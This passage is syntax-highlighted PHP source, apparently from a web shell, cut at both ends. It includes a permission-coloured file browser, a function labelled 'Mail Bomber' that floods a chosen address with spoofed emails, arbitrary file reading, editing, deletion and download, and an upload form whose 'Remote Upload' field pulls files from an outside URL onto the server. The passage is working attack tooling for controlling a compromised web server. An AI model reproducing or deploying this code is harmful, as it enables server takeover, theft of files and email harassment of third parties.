          <span class="k">case</span> <span class="s2">&quot;write&quot;</span><span class="o">:</span> <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=&#39;?dir=</span><span class="si">$dir</span><span class="s2">/</span><span class="si">$link</span><span class="s2">&#39;&amp;gt;&amp;lt;font color=&#39;green&#39;&amp;gt;</span><span class="si">$link</span><span class="s2">&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
          <span class="k">case</span> <span class="s2">&quot;read&quot;</span><span class="o">:</span> <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=&#39;?dir=</span><span class="si">$dir</span><span class="s2">/</span><span class="si">$link</span><span class="s2">&#39;&amp;gt;&amp;lt;font color=&#39;yellow&#39;&amp;gt;</span><span class="si">$link</span><span class="s2">&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
          <span class="k">case</span> <span class="s2">&quot;none&quot;</span><span class="o">:</span> <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=&#39;?dir=</span><span class="si">$dir</span><span class="s2">/</span><span class="si">$link</span><span class="s2">&#39;&amp;gt;&amp;lt;font color=&#39;red&#39;&amp;gt;</span><span class="si">$link</span><span class="s2">&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
          <span class="k">default</span><span class="o">:</span> <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=&#39;?dir=</span><span class="si">$dir</span><span class="s2">/</span><span class="si">$link</span><span class="s2">&#39;&amp;gt;&amp;lt;font color=&#39;red&#39;&amp;gt;</span><span class="si">$link</span><span class="s2">&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;folder&quot;</span><span class="p">;</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">]){</span><span class="nv">$folder</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;img src=&#39;?&quot;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;img=&quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">.</span> <span class="s2">&quot;&#39;&amp;gt; &quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">];}</span>
        <span class="k">else</span><span class="p">{</span><span class="nv">$folder</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;img src=&#39;?img=&quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">.</span> <span class="s2">&quot;&#39;&amp;gt; &quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">];}</span>
        <span class="nb">array_push</span><span class="p">(</span><span class="nv">$folders</span><span class="p">,</span> <span class="nv">$folder</span><span class="p">);</span>
      <span class="p">}</span>
      <span class="k">else</span><span class="p">{</span>
        <span class="nv">$file</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
        <span class="nv">$ext</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nb">end</span><span class="p">(</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">,</span> <span class="nv">$link</span><span class="p">)));</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">nicesize</span><span class="p">(</span><span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$link</span><span class="p">))){</span>
          <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;0B&quot;</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">is_writable</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$link</span><span class="p">)){</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;perm&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;write&#39;</span><span class="p">;}</span>
        <span class="k">elseif</span><span class="p">(</span><span class="nb">is_readable</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$link</span><span class="p">)){</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;perm&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;read&#39;</span><span class="p">;}</span>
        <span class="k">else</span><span class="p">{</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;perm&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;none&#39;</span><span class="p">;}</span>
        <span class="k">switch</span><span class="p">(</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;perm&#39;</span><span class="p">]){</span>
          <span class="k">case</span> <span class="s2">&quot;write&quot;</span><span class="o">:</span> <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=&#39;?act=view&amp;f=&quot;</span> <span class="o">.</span> <span class="nv">$link</span> <span class="o">.</span> <span class="s2">&quot;&amp;dir=</span><span class="si">$dir</span><span class="s2">&#39;&amp;gt;&amp;lt;font color=&#39;green&#39;&amp;gt;</span><span class="si">$link</span><span class="s2">&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
          <span class="k">case</span> <span class="s2">&quot;read&quot;</span><span class="o">:</span> <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=&#39;?act=view&amp;f=&quot;</span> <span class="o">.</span> <span class="nv">$link</span> <span class="o">.</span> <span class="s2">&quot;&amp;dir=</span><span class="si">$dir</span><span class="s2">&#39;&amp;gt;&amp;lt;font color=&#39;yellow&#39;&amp;gt;</span><span class="si">$link</span><span class="s2">&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
          <span class="k">case</span> <span class="s2">&quot;none&quot;</span><span class="o">:</span> <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=&#39;?act=view&amp;f=&quot;</span> <span class="o">.</span> <span class="nv">$link</span> <span class="o">.</span> <span class="s2">&quot;&amp;dir=</span><span class="si">$dir</span><span class="s2">&#39;&amp;gt;&amp;lt;font color=&#39;red&#39;&amp;gt;</span><span class="si">$link</span><span class="s2">&amp;lt;/font&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
          <span class="k">default</span><span class="o">:</span> <span class="o">@</span><span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;a href=&#39;?act=view&amp;f=&quot;</span> <span class="o">.</span> <span class="nv">$link</span> <span class="o">.</span> <span class="s2">&quot;&amp;dir=</span><span class="si">$dir</span><span class="s2">&#39;&amp;gt;&amp;lt;font color=&#39;red&#39;&amp;gt;</span><span class="si">$link</span><span class="s2">&amp;lt;/a&amp;gt;&amp;lt;/font&amp;gt;&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">switch</span><span class="p">(</span><span class="nv">$ext</span><span class="p">){</span>
        <span class="k">case</span> <span class="s2">&quot;exe&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;com&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;jar&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;&quot;</span><span class="o">:</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;binary&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s2">&quot;jpg&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;gif&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;png&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;bmp&quot;</span><span class="o">:</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;image&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s2">&quot;zip&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;tar&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;rar&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;gz&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;cab&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;bz2&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;gzip&quot;</span><span class="o">:</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;compressed&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s2">&quot;txt&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;doc&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;pdf&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;htm&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;html&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;rtf&quot;</span><span class="o">:</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;text&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s2">&quot;wav&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;mp3&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;mp4&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;wma&quot;</span><span class="o">:</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;sound&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
        <span class="k">case</span> <span class="s2">&quot;js&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;vbs&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;c&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;h&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;sh&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;pl&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;py&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;php&quot;</span><span class="o">:</span> <span class="k">case</span> <span class="s2">&quot;h&quot;</span><span class="o">:</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&quot;script&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
        <span class="k">default</span><span class="o">:</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;unknown&quot;</span><span class="p">;</span> <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">]){</span><span class="nv">$file</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;img src=&#39;?&quot;</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;QUERY_STRING&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;img=&quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">.</span> <span class="s2">&quot;&#39; height=&#39;18&#39; width=&#39;18&#39;&amp;gt; &quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;}</span>
        <span class="k">else</span><span class="p">{</span><span class="nv">$file</span> <span class="o">=</span> <span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;img src=&#39;?img=&quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;icon&#39;</span><span class="p">]</span><span class="o">.</span> <span class="s2">&quot;&#39; height=&#39;18&#39; width=&#39;18&#39;&amp;gt; &quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;link&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;td&amp;gt;&quot;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">[</span><span class="s1">&#39;size&#39;</span><span class="p">]</span> <span class="o">.</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;}</span>
        <span class="nb">array_push</span><span class="p">(</span><span class="nv">$files</span><span class="p">,</span> <span class="nv">$file</span><span class="p">);</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$folders</span> <span class="k">as</span> <span class="nv">$folder</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;</span><span class="si">$folder</span><span class="s2">&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;DIR&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);}</span>
  <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">){</span><span class="k">echo</span><span class="p">(</span><span class="nv">$file</span><span class="p">);}</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/table&amp;gt;&quot;</span><span class="p">);</span>
  <span class="nb">closedir</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">email</span><span class="p">(){</span> <span class="c1">// Email bomber function</span>
  <span class="nv">$times</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;times&#39;</span><span class="p">];</span>
  <span class="nv">$to</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">];</span>
  <span class="nv">$subject</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;subject&#39;</span><span class="p">];</span>
  <span class="nv">$body</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;body&#39;</span><span class="p">];</span>
  <span class="nv">$from</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">];</span>
  <span class="nx">style</span><span class="p">();</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;h2&amp;gt;Mail Bomber&amp;lt;/h2&amp;gt;</span>
<span class="s2">  &amp;lt;form method=&#39;POST&#39; action=&#39;?act=email&#39;&amp;gt;</span>
<span class="s2">  &amp;lt;b&amp;gt;Your address:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">  &amp;lt;input name=&#39;from&#39; type=&#39;text&#39; size=&#39;35&#39;&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">  &amp;lt;b&amp;gt;Their address:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">  &amp;lt;input name=&#39;to&#39; type=&#39;text&#39; size=&#39;35&#39;&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">  &amp;lt;b&amp;gt;Subject:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">  &amp;lt;input name=&#39;subject&#39; type=&#39;text&#39; size=&#39;35&#39;&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">  &amp;lt;b&amp;gt;Text:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">  &amp;lt;input name=&#39;body&#39; type=&#39;text&#39; size=&#39;35&#39;&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">  &amp;lt;b&amp;gt;How many times:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">  &amp;lt;input name=&#39;times&#39; type=&#39;text&#39; size=&#39;5&#39;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">  &amp;lt;input name=&#39;submit&#39; type=&#39;submit&#39; value=&#39;Submit&#39;&amp;gt;</span>
<span class="s2">  &amp;lt;/form&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="nv">$to</span> <span class="o">&amp;&amp;</span> <span class="nv">$from</span><span class="p">){</span><span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="nv">$times</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">){</span><span class="nb">mail</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">$to</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">$subject</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">$body</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;From: </span><span class="si">$from</span><span class="s2">&quot;</span><span class="p">);}}</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">view</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="nv">$dir</span><span class="p">){</span> <span class="c1">// File view function</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fileact&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;Download&quot;</span><span class="p">){</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-type: application/octet-stream&quot;</span><span class="p">);</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-length: &quot;</span><span class="o">.</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;contents&#39;</span><span class="p">]));</span>
    <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-disposition: attachment; filename=&quot;</span> <span class="o">.</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;;&quot;</span><span class="p">);</span>
    <span class="nv">$handle</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">);</span>
    <span class="k">echo</span><span class="p">(</span><span class="nb">fread</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span> <span class="nb">filesize</span><span class="p">(</span><span class="nv">$filename</span><span class="p">)));</span>
    <span class="k">die</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="nx">style</span><span class="p">();</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;contents&#39;</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fileact&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;Save&quot;</span><span class="p">){</span>
    <span class="nv">$handle</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
    <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span> <span class="nb">stripslashes</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;contents&#39;</span><span class="p">]));</span>
    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Saved file.&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">);</span>
    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;a href=&#39;?act=view&amp;f=</span><span class="si">$filename</span><span class="s2">&amp;dir=nullz&#39;&amp;gt;Go back&amp;lt;/a&amp;gt;&quot;</span><span class="p">);</span>
    <span class="k">die</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">elseif</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;fileact&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;Delete&quot;</span><span class="p">){</span>
    <span class="nb">unlink</span><span class="p">(</span><span class="nv">$filename</span><span class="p">);</span>
    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Deleted file.&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">);</span>
    <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;a href=&#39;?act=files&#39;&amp;gt;Go back&amp;lt;/a&amp;gt;&quot;</span><span class="p">);</span>
    <span class="k">die</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$dir</span> <span class="o">!=</span> <span class="s2">&quot;nullz&quot;</span><span class="p">){</span> <span class="c1">// heh</span>
    <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$dir</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="o">.</span><span class="nv">$filename</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="nv">$bad</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;&quot;</span><span class="p">,</span> <span class="s2">&quot;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="nv">$good</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;&amp;lt;&quot;</span><span class="p">,</span> <span class="s2">&quot;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="nv">$file</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">&#39;r&#39;</span><span class="p">);</span>
  <span class="nv">$content</span> <span class="o">=</span> <span class="nb">fread</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="o">@</span><span class="nb">filesize</span><span class="p">(</span><span class="nv">$filename</span><span class="p">));</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;form name=&#39;file&#39; method=&#39;POST&#39; action=&#39;?act=view&amp;dir=</span><span class="si">$dir</span><span class="s2">&amp;f=</span><span class="si">$filename</span><span class="s2">&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;textarea style=&#39;width:100%; height:92%;&#39; name=&#39;contents&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="nb">str_replace</span><span class="p">(</span><span class="nv">$bad</span><span class="p">,</span> <span class="nv">$good</span><span class="p">,</span> <span class="nv">$content</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;input name=&#39;fileact&#39; type=&#39;submit&#39; value=&#39;Save&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;input name=&#39;fileact&#39; type=&#39;submit&#39; value=&#39;Delete&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;input name=&#39;fileact&#39; type=&#39;submit&#39; value=&#39;Download&#39;&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;/form&amp;gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">edit</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">){</span> <span class="c1">// File edit function</span>
  <span class="nx">style</span><span class="p">();</span>
  <span class="nv">$handle</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">);</span>
  <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$handle</span><span class="p">,</span> <span class="nv">$contents</span><span class="p">);</span>
  <span class="nb">fclose</span><span class="p">(</span><span class="nv">$handle</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;Saved file.&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;a href=&#39;?act=files&#39;&amp;gt;Go back&amp;lt;/a&amp;gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="k">function</span> <span class="nf">upload</span><span class="p">(){</span> <span class="c1">// Uploading frontend function</span>
  <span class="k">global</span> <span class="nv">$curdir</span><span class="p">;</span>
  <span class="nx">style</span><span class="p">();</span>
  <span class="k">echo</span><span class="p">(</span><span class="s2">&quot;&amp;lt;form name=&#39;files&#39; enctype=&#39;multipart/form-data&#39; method=&#39;POST&#39;&amp;gt;</span>
<span class="s2">  &amp;lt;b&amp;gt;Output Directory&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">  &amp;lt;input type=&#39;text&#39; name=&#39;loc&#39; size=&#39;65&#39; value=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$curdir</span> <span class="o">.</span> <span class="s2">&quot;&#39;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">  &amp;lt;b&amp;gt;Remote Upload&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">  &amp;lt;input type=&#39;text&#39; name=&#39;rem&#39; size=&#39;65&#39;&amp;gt;</span>
<span class="s2">  &amp;lt;input type=&#39;submit&#39; value=&#39;Grab&#39;&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">  &amp;lt;b&amp;gt;Local File Upload&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;</span>
<span class="s2">  &amp;lt;input name=&#39;up&#39; type=&#39;file&#39; size=&#39;65&#39;&amp;gt;</span>
<span class="s2">  &amp;lt;input type=&#39;submit&#39; value=&#39;Upload&#39;&amp;gt;</span>
<span class="s2">  &amp;lt;/form&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">);</span>
  <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;rem&#39;</span><span class="p">]){</span><span class="nx">grab</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;rem&#39;</span><span class="p">]);}</span>
